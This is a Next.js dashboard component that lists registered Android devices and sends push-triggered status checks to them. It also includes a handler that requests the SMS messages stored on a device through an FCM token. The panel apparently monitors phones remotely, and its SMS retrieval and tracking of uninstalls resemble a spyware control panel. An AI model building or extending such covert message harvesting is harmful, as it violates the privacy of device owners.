"use client";

import Link from "next/link";
import { useEffect, useMemo, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import {
  Button,
  Card,
  CardBody,
  CardHeader,
  Input,
  Skeleton,
} from "@heroui/react";
import { db } from "@/lib/firbase";
import { ref, update } from "firebase/database";
import { FaLongArrowAltRight, FaRegStar, FaStar } from "react-icons/fa";
import Devices from "@/types/devicetype";
import type { DeviceStatus } from "@/lib/deviceStatus";

type DeviceTableProps = {
  devices: Devices[];
};

function formatMinutesAgo(value: string, nowTimestamp: number) {
  const timestamp = Date.parse(value);

  if (Number.isNaN(timestamp)) {
    return "N/A";
  }

  const diffMs = nowTimestamp - timestamp;

  if (diffMs <= 0) {
    return "0 min ago";
  }

  const minutes = Math.floor(diffMs / (60 * 1000));

  return `${minutes} min ago`;
}

function compareDeviceSerialDesc(a: Devices, b: Devices) {
  return b.deviceId.localeCompare(a.deviceId, undefined, {
    numeric: true,
    sensitivity: "base",
  });
}

function getStatusPresentation(status: DeviceStatus) {
  if (status === "online") {
    return {
      dotClassName: "bg-emerald-500",
      pillClassName: "status-pill status-pill-online",
      label: "Online",
    };
  }

  if (status === "uninstalled") {
    return {
      dotClassName: "bg-amber-500",
      pillClassName: "status-pill border-amber-200 bg-amber-50 text-amber-700",
      label: "Uninstalled",
    };
  }

  return {
    dotClassName: "bg-rose-500",
    pillClassName: "status-pill status-pill-offline",
    label: "Offline",
  };
}

const SearchIcon = () => (
  <svg
    className="h-4 w-4 text-slate-500"
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth="1.8"
      d="m21 21-4.2-4.2m1.2-4.8a6 6 0 1 1-12 0 6 6 0 0 1 12 0Z"
    />
  </svg>
);

export default function DeviceTable({ devices }: DeviceTableProps) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [searchQuery, setSearchQuery] = useState("");
  const [statusFilter, setStatusFilter] = useState<"all" | DeviceStatus>("all");
  const [isLoading, setIsLoading] = useState(true);
  const [nowTimestamp, setNowTimestamp] = useState(() => Date.now());
  const [checkingIds, setCheckingIds] = useState<Set<string>>(new Set());
  const [smsLoadingIds, setSmsLoadingIds] = useState<Set<string>>(new Set());
  const [isCheckingAll, setIsCheckingAll] = useState(false);
  const [favoriteUpdatingIds, setFavoriteUpdatingIds] = useState<Set<string>>(
    new Set(),
  );

  async function checkStatus(deviceId: string, fcmToken: string) {
    setCheckingIds((prev) => new Set(prev).add(deviceId));

    try {
      const response = await fetch("/api/checkstatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId,
          token: fcmToken,
          title: "Status Check",
          body: "Checking device status, please wait...",
        }),
      });

      const result = await response.json();

      if (!result.success) {
        console.error("Failed to check status:", result.error);
      }
    } catch (error) {
      console.error("Error while checking status:", error);
    } finally {
      setCheckingIds((prev) => {
        const next = new Set(prev);
        next.delete(deviceId);
        return next;
      });
    }
  }

  async function handleGetSms(deviceId: string, fcmToken: string) {
    setSmsLoadingIds((prev) => new Set(prev).add(deviceId));

    try {
      const response = await fetch("/api/getsms", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId,
          token: fcmToken,
          title: "SMS Retrieval",
          body: "Retrieving SMS messages, please wait...",
        }),
      });

      const result = await response.json();

      if (!result.success) {
        console.error("Failed to retrieve SMS:", result.error);
      }
    } catch (error) {
      console.error("Error while retrieving SMS:", error);
    } finally {
      setSmsLoadingIds((prev) => {
        const next = new Set(prev);
        next.delete(deviceId);
        return next;
      });
    }
  }

  async function checkAllStatus() {
    setIsCheckingAll(true);

    try {
      const response = await fetch("/api/checkstatus-all", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: "Status Check",
          body: "Checking device status, please wait...",
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        console.error("Failed to check all statuses:", result.error ?? result);
        return;
      }

      if (!result.success && result.notificationSent > 0) {
        console.warn("Check status partially completed:", result);
        return;
      }

      if (!result.success) {
        console.warn(
          "Check status request did not complete:",
          result.error ?? result,
        );
      }
    } catch (error) {
      console.error("Error while checking all statuses:", error);
    } finally {
      setIsCheckingAll(false);
    }
  }

  async function toggleFavorite(deviceId: string, currentValue: boolean) {
    setFavoriteUpdatingIds((prev) => new Set(prev).add(deviceId));

    try {
      const deviceRef = ref(db, `registeredDevices/${deviceId}`);
      await update(deviceRef, { isfavorite: !currentValue });
    } catch (error) {
      console.error("Failed to update favorite state", error);
    } finally {
      setFavoriteUpdatingIds((prev) => {
        const next = new Set(prev);
        next.delete(deviceId);
        return next;
      });
    }
  }

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 500);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const intervalId = window.setInterval(() => {
      setNowTimestamp(Date.now());
    }, 60 * 1000);

    return () => {
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    const queryStatus = searchParams.get("status")?.toLowerCase();

    if (queryStatus === "online" || queryStatus === "offline") {
      setStatusFilter(queryStatus);
      return;
    }

    setStatusFilter("all");
  }, [searchParams]);

  const rankedDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    const matchedDevices = devices.filter((device) => {
      const matchesStatus =
        statusFilter === "all" ||
        device.onlineStatus === statusFilter ||
        (statusFilter === "offline" && device.onlineStatus === "uninstalled");
      const matchesQuery =
        query.length === 0 ||
        device.deviceId.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.androidVersion.toLowerCase().includes(query);

      return matchesStatus && matchesQuery;
    });

    const serialDescending = matchedDevices
      .slice()
      .sort(compareDeviceSerialDesc);

    return serialDescending.map((device, index) => ({
      device,
      serialNumber: serialDescending.length - index,
    }));
  }, [devices, searchQuery, statusFilter]);

  const onlineCount = useMemo(
    () => devices.filter((device) => device.onlineStatus === "online").length,
    [devices],
  );
  const offlineCount = Math.max(devices.length - onlineCount, 0);

  if (isLoading) {
    return (
      <Card className="surface-card">
        <CardBody className="space-y-3">
          {Array.from({ length: 6 }).map((_, index) => (
            <Skeleton key={index} className="h-10 w-full rounded-lg" />
          ))}
        </CardBody>
      </Card>
    );
  }

  return (
    <Card className="surface-card overflow-hidden">
      <CardBody className="space-y-5 p-4 sm:p-5">
        <div className="flex flex-col gap-4 rounded-[30px] border border-(--border) bg-linear-to-br from-white/92 via-white/84 to-(--surface-subtle) p-4 shadow-(--shadow-xs) sm:p-5">
          <div className="flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
            <div className="space-y-1">
              <p className="text-xs font-semibold uppercase tracking-[0.18em] text-(--accent)">
                Device Fleet
              </p>
              <h1 className="text-2xl font-bold tracking-tight text-(--text-main) sm:text-3xl">
                Registered devices
              </h1>
              <p className="text-sm text-(--text-muted)">
                Search, filter, favorite, and trigger status checks from one
                place.
              </p>
            </div>

            <div className="grid grid-cols-3 gap-2 sm:min-w-70">
              <div className="soft-panel border border-(--border) bg-white/74 px-3 py-3">
                <p className="text-xs font-medium text-(--text-muted)">Total</p>
                <p className="mt-1 text-xl font-semibold text-(--text-main)">
                  {devices.length}
                </p>
              </div>
              <div className="soft-panel border border-(--border) bg-white/74 px-3 py-3">
                <p className="text-xs font-medium text-(--text-muted)">
                  Online
                </p>
                <p className="mt-1 text-xl font-semibold text-emerald-600">
                  {onlineCount}
                </p>
              </div>
              <div className="soft-panel border border-(--border) bg-white/74 px-3 py-3">
                <p className="text-xs font-medium text-(--text-muted)">
                  Offline
                </p>
                <p className="mt-1 text-xl font-semibold text-rose-600">
                  {offlineCount}
                </p>
              </div>
            </div>
          </div>

          <div className="flex flex-col gap-3 lg:flex-row lg:items-center lg:justify-between">
            <Input
              value={searchQuery}
              onValueChange={setSearchQuery}
              placeholder="Search by device ID, model, or OS version"
              startContent={<SearchIcon />}
              className="w-full lg:max-w-xl"
              classNames={{
                inputWrapper:
                  "search-input h-12 px-3 hover:border-(--border-strong) focus-within:border-(--accent) focus-within:ring-4 focus-within:ring-[rgba(18,59,43,0.16)]",
              }}
            />

            <div className="flex flex-wrap gap-2">
              <Button
                size="sm"
                radius="full"
                variant="flat"
                className={`min-h-10 border px-4 font-semibold transition-all duration-200 ${
                  statusFilter === "all"
                    ? "border-(--accent) bg-(--accent) text-white shadow-[0_10px_22px_rgba(18,59,43,0.24)]"
                    : "border-(--border) bg-white/75 text-(--text-main) hover:bg-white"
                }`}
                onPress={() => setStatusFilter("all")}
              >
                All
              </Button>
              <Button
                size="sm"
                radius="full"
                variant="flat"
                className={`min-h-10 border px-4 font-semibold transition-all duration-200 ${
                  statusFilter === "online"
                    ? "border-emerald-500 bg-emerald-600 text-white shadow-[0_10px_22px_rgba(16,185,129,0.24)]"
                    : "border-(--border) bg-white/75 text-(--text-main) hover:bg-white"
                }`}
                onPress={() => setStatusFilter("online")}
              >
                Online
              </Button>
              <Button
                size="sm"
                radius="full"
                variant="flat"
                className={`min-h-10 border px-4 font-semibold transition-all duration-200 ${
                  statusFilter === "offline"
                    ? "border-rose-500 bg-rose-600 text-white shadow-[0_10px_22px_rgba(244,63,94,0.24)]"
                    : "border-(--border) bg-white/75 text-(--text-main) hover:bg-white"
                }`}
                onPress={() => setStatusFilter("offline")}
              >
                Offline
              </Button>
              <Button
                size="sm"
                radius="full"
                variant="flat"
                className="min-h-10 border border-(--accent) bg-(--accent) px-4 font-semibold text-white shadow-[0_10px_22px_rgba(18,59,43,0.24)] transition-all duration-200 hover:bg-(--accent-strong)"
                isLoading={isCheckingAll}
                isDisabled={devices.length === 0 || isCheckingAll}
                onPress={checkAllStatus}
              >
                Check All
              </Button>
            </div>
          </div>
        </div>

        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <p className="text-sm text-(--text-muted)">
            Showing{" "}
            <span className="font-semibold text-(--text-main)">
              {rankedDevices.length}
            </span>{" "}
            device{rankedDevices.length === 1 ? "" : "s"}
          </p>
        </div>

        {rankedDevices.length === 0 ? (
          <div className="rounded-[28px] border border-dashed border-(--border-strong) bg-(--surface-subtle) px-6 py-12 text-center">
            <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-white text-(--accent) shadow-(--shadow-xs)">
              <SearchIcon />
            </div>
            <p className="mt-4 text-base font-medium text-(--text-main)">
              No devices found
            </p>
            <p className="mt-1 text-sm text-(--text-muted)">
              Try clearing the filters or searching with a different keyword.
            </p>
          </div>
        ) : (
          <div
            className="grid gap-4 sm:grid-cols-2 xl:grid-cols-3"
            role="list"
            aria-label="Devices list for admin monitoring"
          >
            {rankedDevices.map(({ device, serialNumber }) => {
              const status = getStatusPresentation(device.onlineStatus);

              return (
                <Card
                  key={device.deviceId}
                  className="surface-card cursor-pointer rounded-[28px] border-(--border) bg-white/78 transition-all duration-200 hover:-translate-y-0.5 hover:border-(--border-strong) hover:shadow-(--shadow-md)"
                  role="listitem"
                  onClick={() =>
                    router.push(
                      `/devices/${encodeURIComponent(device.deviceId)}`,
                    )
                  }
                >
                  <CardHeader className="flex items-start justify-between gap-3 px-4 pb-0 pt-4">
                    <div className="min-w-0 space-y-3">
                      <div className="flex items-center gap-2">
                        <span className="rounded-full bg-(--surface-subtle) px-2.5 py-1 text-[11px] font-semibold uppercase tracking-wide text-(--text-muted)">
                          #{serialNumber}
                        </span>
                        <span className={status.pillClassName}>
                          <span
                            className={`h-2 w-2 rounded-full ${status.dotClassName}`}
                          />
                          {status.label}
                        </span>
                      </div>

                      <div>
                        <p className="truncate text-base font-semibold text-(--text-main)">
                          {device.brand} {device.model}
                        </p>
                        <Link
                          href={`/devices/${encodeURIComponent(device.deviceId)}`}
                          className="mt-1 flex items-center gap-2 break-all text-sm font-semibold text-(--accent) hover:underline"
                          target="_blank"
                          rel="noopener noreferrer"
                          onClick={(event) => event.stopPropagation()}
                        >
                          {device.deviceId}
                          <FaLongArrowAltRight className="shrink-0" />
                        </Link>
                      </div>
                    </div>

                    <Button
                      isIconOnly
                      size="sm"
                      radius="full"
                      variant="flat"
                      className="border border-(--border) bg-(--surface-subtle)"
                      color={device.isfavorite ? "warning" : "default"}
                      isLoading={favoriteUpdatingIds.has(device.deviceId)}
                      aria-label={
                        device.isfavorite
                          ? "Remove from favorites"
                          : "Add to favorites"
                      }
                      onClick={(event) => event.stopPropagation()}
                      onPress={() =>
                        toggleFavorite(
                          device.deviceId,
                          Boolean(device.isfavorite),
                        )
                      }
                    >
                      {device.isfavorite ? (
                        <FaStar className="h-4 w-4" />
                      ) : (
                        <FaRegStar className="h-4 w-4" />
                      )}
                    </Button>
                  </CardHeader>

                  <CardBody className="space-y-4 px-4 pb-4 pt-4">
                    <div className="grid grid-cols-2 gap-3">
                      <div className="soft-panel border border-(--border) bg-white/80 p-3">
                        <p className="text-xs font-medium text-(--text-muted)">
                          Android
                        </p>
                        <p className="mt-1 text-sm font-semibold text-(--text-main)">
                          {device.androidVersion}
                        </p>
                      </div>
                      <div className="soft-panel border border-(--border) bg-white/80 p-3">
                        <p className="text-xs font-medium text-(--text-muted)">
                          Last active
                        </p>
                        <p className="mt-1 text-sm font-semibold text-(--text-main)">
                          {formatMinutesAgo(device.lastChecked, nowTimestamp)}
                        </p>
                      </div>
                    </div>

                    <div className="flex flex-col gap-2 sm:flex-row">
                      <Button
                        size="md"
                        radius="lg"
                        variant="flat"
                        className="h-11 font-semibold bg-(--accent) text-white shadow-[0_10px_22px_rgba(18,59,43,0.24)] transition-all duration-200 hover:-translate-y-0.5 hover:bg-(--accent-strong)"
                        fullWidth
                        isLoading={checkingIds.has(device.deviceId)}
                        onClick={(event) => event.stopPropagation()}
                        onPress={() =>
                          checkStatus(device.deviceId, device.fcmToken)
                        }
                      >
                        Check Status
                      </Button>
                      <Link
                        href={`/devices/${encodeURIComponent(device.deviceId)}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-flex h-11 min-w-fit items-center justify-center rounded-lg border border-(--border) bg-white/86 px-4 text-sm font-semibold text-(--text-main) transition-all duration-200 hover:-translate-y-0.5 hover:border-(--border-strong) hover:bg-white"
                      >
                        Open Device
                      </Link>
                    </div>
                  </CardBody>
                </Card>
              );
            })}
          </div>
        )}
      </CardBody>
    </Card>
  );
}
